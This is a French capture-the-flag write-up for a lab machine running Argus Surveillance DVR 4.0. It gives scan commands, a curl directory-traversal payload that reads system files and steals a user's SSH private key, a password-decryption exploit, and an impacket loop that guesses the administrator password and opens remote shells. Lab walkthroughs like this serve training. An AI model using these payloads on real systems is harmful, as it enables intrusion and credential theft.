  # DVR4

	sudo masscan -p1-65535,U:1-65535 192.168.174.179 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.174.179 -oN nmap.txt
	feroxbuster --silent -u http://192.168.174.179:8080
	
Scans classiques.

    PORT STATE SERVICE VERSION  
    22/tcp open ssh Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)  
    135/tcp open msrpc Microsoft Windows RPC  
    139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
    445/tcp open microsoft-ds?  
    5040/tcp open unknown  
    8080/tcp open http-proxy  
    49664/tcp open msrpc Microsoft Windows RPC  
    49665/tcp open msrpc Microsoft Windows RPC  
    49666/tcp open msrpc Microsoft Windows RPC  
    49667/tcp open msrpc Microsoft Windows RPC  
    49668/tcp open msrpc Microsoft Windows RPC  
    49669/tcp open msrpc Microsoft Windows RPC

http://192.168.174.179:8080/ActiveXIFrame.html => Création de caméras
</br>http://192.168.174.179:8080/Users.html => Liste des utilisateurs (Administrator et Viewer)

Le site utilise Argus Surveillance DVR 4.0 comme l'indiquent les en-têtes du site et le titre de la VM. Il y a plusieurs exploits existants : 
	</br>- https://www.exploit-db.com/exploits/50261
	</br>- https://www.exploit-db.com/exploits/50130
	</br>- https://www.exploit-db.com/exploits/45312
	</br>- https://www.exploit-db.com/exploits/45296

Le seul que l'on peut utiliser pour l'instant est l'exploit de type Directory Traversal, et en effet le PoC fonctionne bien. J'ai également réussi à avoir le fichier **C:\Windows\System32\drivers\etc\hosts** mais il ne contenait rien d'intéressant. On a vu qu'il y avait un service SSH et on connaît le nom de deux utilisateurs, j'ai essayé les fichiers **C:\Users\Administrator\\.ssh\id_rsa** et  **C:\Users\Viewer\\.ssh\id_rsa** et le deuxième est passé. J'ai aussi testé **%UserProfile%\\.ssh\id_rsa** par curiosité mais sans succès. 


	curl "http://192.168.174.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

	curl --output id_rsa "http://192.168.174.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

	chmod 600 id_rsa

	ssh -i id_rsa -l Viewer 192.168.174.179
	...
	type C:\Users\Viewer\Desktop\local.txt

### Élévation de privilèges :

On reprend l'exploit /50130 trouvé plus haut. Attention à bien prendre le mot de passe chiffré de l'administrateur et non pas celui de Viewer. Il faut prendre celui que l'on trouve en premier après la ligne "LoginName0=Administrator" et le remplacer dans l'exploit.

	python exploit_Argus_DVR_50130.py

On obtient le résultat suivant : 

    [+] ECB4:1
    [+] 53D1:4
    [+] 6069:W
    [+] F641:a
    [+] E03B:t
    [+] D9BD:c
    [+] 956B:h
    [+] FE36:D
    [+] BD8F:0
    [+] 3CD9:g
    [-] D9A8:Unknown

Le problème est que le dernier caractère n'a pas été trouvé. Au lieu de bêtement tester manuellement tous les caractères spéciaux j'ai décidé d'automatiser le processus avec Impacket et une boucle. J'ai choisi le service SMB parce que je l'ai vu sur Nmap et parce que c'est généralement une valeur sûre . Par chance le caractère manquant était un "$" et j'avais pensé à l'inclure dans le tableau dès mes premiers tests. Impacket ne m'a sorti que des erreurs mais l'erreur du "$" était différente et cela a attiré mon attention. En revanche la connexion se fermait directement et j'ai dû faire autrement pour la vraie connexion finale : 

	Array=("\\"  "\$"  "\#"  "\@"  "\!"  "\?"  "\^")
	for i in $Array ;  do  print $i ;  impacket-smbexec Administrator:"14WatchD0g$i"@192.168.174.179;  done
	...
	impacket-smbexec Administrator:'14WatchD0g$'@192.168.174.179
	...
	impacket-wmiexec Administrator:'14WatchD0g$'@192.168.174.179 
	C:\>whoami
	C:\>type C:\Users\Administrator\Desktop\proof.txt
	

